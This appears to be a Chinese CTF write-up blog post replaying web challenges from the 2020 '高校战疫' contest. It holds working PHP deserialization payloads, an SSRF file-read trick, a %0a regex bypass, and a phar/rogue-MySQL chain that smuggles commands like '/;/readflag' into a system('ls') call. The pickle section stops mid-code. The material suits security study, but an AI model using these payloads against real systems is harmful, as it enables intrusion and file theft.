<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="web,ctf,">










<meta name="description" content="各校大佬锤爆我Orz">
<meta name="keywords" content="web,ctf">
<meta property="og:type" content="article">
<meta property="og:title" content="高校战疫 web 复现">
<meta property="og:url" content="http://yoursite.com/2020/03/14/高校战疫-web-wp/index.html">
<meta property="og:site_name" content="k0t0r1の家">
<meta property="og:description" content="各校大佬锤爆我Orz">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://shifeng-kaze.cn/blog/GXZY_web_wp/fd5f5da0167c9d14c17d50233da480cc.png">
<meta property="og:image" content="http://shifeng-kaze.cn/blog/GXZY_web_wp/4c4fce5b82f9c782d46c9aa5cfcf1df8.png">
<meta property="og:image" content="http://shifeng-kaze.cn/blog/GXZY_web_wp/077893f2ac8f8db6880077a5d779c7f9.png">
<meta property="og:image" content="http://shifeng-kaze.cn/blog/GXZY_web_wp/8daac8b98a6d8c5e144a48d1d212ec1f.png">
<meta property="og:image" content="http://shifeng-kaze.cn/blog/GXZY_web_wp/9e6c90288d2ad5430481d605dd749127.png">
<meta property="og:image" content="http://shifeng-kaze.cn/blog/GXZY_web_wp/45bf8633e06e759fe9943acfb71c3fbf.png">
<meta property="og:updated_time" content="2020-04-30T10:31:17.688Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="高校战疫 web 复现">
<meta name="twitter:description" content="各校大佬锤爆我Orz">
<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/GXZY_web_wp/fd5f5da0167c9d14c17d50233da480cc.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/03/14/高校战疫-web-wp/">





  <title>高校战疫 web 复现 | k0t0r1の家</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">k0t0r1の家</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/高校战疫-web-wp/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="k0t0r1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="k0t0r1の家">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">高校战疫 web 复现</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T18:27:01+08:00">
                2020-03-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>各校大佬锤爆我Orz</p>
<a id="more"></a>
<h2 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h2><p>查看源码<br><code>&lt;!--?time=Y或者?time=2020--&gt;</code><br>提示了<code>date(&#39;Y&#39;)=2020</code>，而在<code>date()</code>中，可以通过<code>\</code>转义字符防止被解释<br>于是在每个字符前加一个<code>\</code>，简单回显注即可</p>
<p>然后通过<code>file://localhost/</code>进行SSRF读取本地文件<br>flag无法直接读，通过<br><code>file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</code><br>获得一段源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class trick&#123;</span><br><span class="line">    public $gf;</span><br><span class="line">    public function content_to_file($content)&#123;  </span><br><span class="line">        $passwd = $_GET[&apos;pass&apos;];</span><br><span class="line">        if(preg_match(&apos;/^[a-z]+\.passwd$/m&apos;,$passwd)) </span><br><span class="line">        &#123;   </span><br><span class="line">            if(strpos($passwd,&quot;20200202&quot;))&#123;</span><br><span class="line">                echo file_get_contents(&quot;/&quot;.$content);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    public function aiisc_to_chr($number)&#123;</span><br><span class="line">        if(strlen($number)&gt;2)&#123;</span><br><span class="line">            $str = &quot;&quot;;</span><br><span class="line">            $number = str_split($number,2);</span><br><span class="line">            foreach ($number as $num ) &#123;</span><br><span class="line">                $str = $str .chr($num);</span><br><span class="line">            &#125;</span><br><span class="line">            return strtolower($str);</span><br><span class="line">        &#125;</span><br><span class="line">        return chr($number);</span><br><span class="line">    &#125;</span><br><span class="line">    public function calc()&#123;</span><br><span class="line">        $gf=$this-&gt;gf;</span><br><span class="line">        if(!preg_match(&apos;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&apos;, $gf))&#123;</span><br><span class="line">            eval(&apos;$content=&apos;.$gf.&apos;;&apos;);</span><br><span class="line">            $content =  $this-&gt;aiisc_to_chr($content); </span><br><span class="line">            return $content;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;content_to_file($this-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[&apos;code&apos;])));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在正则中界定符是<code>/n</code>, 会把输入当成多行。而这个<code>$</code>会匹配换行符, <code>preg_match()</code>+<code>strpos()</code>可以直接用<code>%0a</code>绕过<br><code>calc()</code>里面则是可以用<code>!!&#39;@&#39;</code>来拼凑，直接取反也可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class trick&#123;</span><br><span class="line">	public $gf;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;gf = ~&apos;70766571&apos;;</span><br><span class="line">        $this-&gt;gf=&apos;~\&apos;&apos;.$this-&gt;gf.&apos;\&apos;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$trick = new trick();</span><br><span class="line">echo urlencode(base64_encode(serialize($trick)));</span><br><span class="line"></span><br><span class="line">// Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoxMToififIz8jJycrIziciO30%3D</span><br></pre></td></tr></table></figure>
<p>payload：<br><code>?pass=aa.passwd%0A20200202&amp;code=Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoxMToififIz8jJycrIziciO30%3D</code></p>
<h2 id="hardphp"><a href="#hardphp" class="headerlink" title="hardphp"></a>hardphp</h2><h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2><p>这题没拿下源码，看wp来写的</p>
<p>先是<code>test_sql.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">$ip = $_POST[&apos;ip&apos;];</span><br><span class="line">$user = $_POST[&apos;user&apos;];</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">$option = $_POST[&apos;option&apos;];</span><br><span class="line">$m = new db($ip,$user,$password,$option);</span><br><span class="line">$m-&gt;testquery();</span><br></pre></td></tr></table></figure>
<p>用于连接远程数据库<br>接着看到Db类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">class Db</span><br><span class="line">&#123;</span><br><span class="line">    public $ip;</span><br><span class="line">    public $user;</span><br><span class="line">    public $password;</span><br><span class="line">    public $option;</span><br><span class="line">    function __construct($ip,$user,$password,$option)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;ip=$ip;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">        $this-&gt;option=$option;</span><br><span class="line">    &#125;</span><br><span class="line">    function testquery()</span><br><span class="line">    &#123;</span><br><span class="line">        $m = new mysqli($this-&gt;ip,$this-&gt;user,$this-&gt;password);</span><br><span class="line">        if($m-&gt;connect_error)&#123;</span><br><span class="line">            die($m-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $m-&gt;options($this-&gt;option,1);</span><br><span class="line">        $result=$m-&gt;query(&apos;select 1;&apos;);</span><br><span class="line">        if($result-&gt;num_rows&gt;0)</span><br><span class="line">        &#123;</span><br><span class="line">            echo &apos;测试完毕，数据库服务器处于开启状态&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &apos;测试完毕,数据库服务器未开启&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到用了<code>select 1;</code>来测试远程数据库是否开启，这里自然就想到用<code>rogue mysql server</code>来读取服务器文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">//var_dump($_FILES[&quot;file&quot;]);</span><br><span class="line">$file = new File($_FILES[&quot;file&quot;]);</span><br><span class="line">$fileupload = new Fileupload($file);</span><br><span class="line">$fileupload-&gt;deal();</span><br><span class="line">echo &quot;存储的图片:&quot;.&quot;</span><br><span class="line">&quot;;</span><br><span class="line">$ls = new Listfile(&apos;./uploads/&apos;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]));</span><br><span class="line">echo $ls-&gt;listdir().&quot;</span><br><span class="line">&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>再看到上传文件处，跟着进入到几个相关联的类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    public $uploadfile;</span><br><span class="line">    function __construct($filename)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uploadfile=$filename;</span><br><span class="line">    &#125;</span><br><span class="line">    function xs()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;请求结束&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Fileupload</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    function deal()</span><br><span class="line">    &#123;</span><br><span class="line">        $extensionarr=array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);</span><br><span class="line">        $extension = pathinfo($this-&gt;file-&gt;uploadfile[&apos;name&apos;], PATHINFO_EXTENSION);</span><br><span class="line">        $type = $this-&gt;file-&gt;uploadfile[&apos;type&apos;];</span><br><span class="line">        //echo &quot;type: &quot;.$type;</span><br><span class="line">        $filetypearr=array(&quot;image/jpeg&quot;,&quot;image/png&quot;,&quot;image/gif&quot;);</span><br><span class="line">        if(in_array($extension,$extensionarr)&amp;in_array($type,$filetypearr)&amp;$this-&gt;file-&gt;uploadfile[&quot;size&quot;]&lt;204800)</span><br><span class="line">        &#123;</span><br><span class="line">            if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123;</span><br><span class="line">                echo &quot;错误：: &quot; .$this-&gt;file-&gt;uploadfile[&quot;error&quot;] . &quot;&quot;;</span><br><span class="line">                die();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                if(!is_dir(&quot;./uploads/&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]).&quot;/&quot;))&#123;</span><br><span class="line">                    mkdir(&quot;./uploads/&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]).&quot;/&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                $upload_dir=&quot;./uploads/&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]).&quot;/&quot;;</span><br><span class="line">                move_uploaded_file($this-&gt;file-&gt;uploadfile[&quot;tmp_name&quot;],$upload_dir.md5($this-&gt;file-&gt;uploadfile[&apos;name&apos;]).&quot;.&quot;.$extension);</span><br><span class="line">                echo &quot;上传成功&quot;.&quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;不被允许的文件类型&quot;.&quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file-&gt;xs();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Listfile</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line">    function listdir()&#123;</span><br><span class="line">        system(&quot;ls &quot;.$this-&gt;file).&quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        system(&quot;ls &quot;.$this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里看到<code>Listfile</code>类中有<code>__call()</code>，可以通过控制<code>file</code>属性来执行任意命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Listfile</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line">    function listdir()&#123;</span><br><span class="line">        system(&quot;ls &quot;.$this-&gt;file).&quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        system(&quot;ls &quot;.$this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>Fileupload</code>类中的<code>__destruct()</code>将<code>file</code>属性设为<code>Listfile</code>类后即可触发</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">	$this-&gt;file-&gt;xs();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>既然能上传文件，又有反序列化，那就可以用到phar了<br>不过这里需要有能够触发phar的位置，这里还是要看xzs师傅的骚操作<br><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener"><br>Phar与Stream Wrapper造成PHP RCE的深入挖掘</a><br>通过MYSQL的<code>LOAD DATA LOCAL INFILE</code>触发</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Fileupload</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">&#125;</span><br><span class="line">class Listfile</span><br><span class="line">&#123;</span><br><span class="line">    public $file = &apos;/;&apos;; # 要执行的命令</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;file.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&quot;);</span><br><span class="line">$fileupload = new Fileupload();</span><br><span class="line">$fileupload-&gt;file = new Listfile();</span><br><span class="line">$phar-&gt;setMetadata($fileupload);</span><br><span class="line">$phar-&gt;addFromString(&quot;1.txt&quot;, &quot;test&quot;); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"># /;</span><br><span class="line"># /;/readflag;</span><br></pre></td></tr></table></figure>
<p>生成文件后上传</p>
<p><a href="https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py" target="_blank" rel="noopener">Rogue-MySql-Server</a><br>修改读取的文件为<code>phar://./uploads/hash/test.jpg</code><br>然后访问伪造数据库即可</p>
<h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>题目源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">from flask import Flask, Response, render_template, request</span><br><span class="line">import secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Animal:</span><br><span class="line">    def __init__(self, name, category):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return f&apos;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&apos;</span><br><span class="line"></span><br><span class="line">    def __eq__(self, other):</span><br><span class="line">        return type(other) is Animal and self.name == other.name and self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        if module == &apos;__main__&apos;:</span><br><span class="line">            return getattr(sys.modules[&apos;__main__&apos;], name)</span><br><span class="line">        raise pickle.UnpicklingError(&quot;global &apos;%s.%s&apos; is forbidden&quot; % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restricted_loads(s):</span><br><span class="line">    return RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read(filename, encoding=&apos;utf-8&apos;):</span><br><span class="line">    with open(filename, &apos;r&apos;, encoding=encoding) as fin:</span><br><span class="line">        return fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def index():</span><br><span class="line">    if request.args.get(&apos;source&apos;):</span><br><span class="line">        return Response(read(__file__), mimetype=&apos;text/plain&apos;)</span><br><span class="line"></span><br><span class="line">    if request.method == &apos;POST&apos;:</span><br><span class="line">        try:</span><br><span class="line">            pickle_data = request.form.get(&apos;data&apos;)</span><br><span class="line">            if b&apos;R&apos; in base64.b64decode(pickle_data):</span><br><span class="line">                return &apos;No... I don\&apos;t like R-things. No Rabits, Rats, Roosters or RCEs.&apos;</span><br><span class="line">            else:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">                if type(result) is not Animal:</span><br><span class="line">                    return &apos;Are you sure that is an animal???&apos;</span><br><span class="line">            correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">            return render_template(&apos;unpickle_result.html&apos;, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            return &quot;Something wrong&quot;</span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(&apos;一给我哩giaogiao&apos;, &apos;Giao&apos;)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    return render_template(&apos;unpickle_page.html&apos;, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;, port=5000)</span><br></pre></td></tr></table></figure>
<p>这题主要参考这篇文章<br><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a></p>
<p>先一这题为例子分析一下pickle反序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import pickletools</span><br><span class="line"></span><br><span class="line">class Animal:</span><br><span class="line">    def __init__(self, name, category):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return 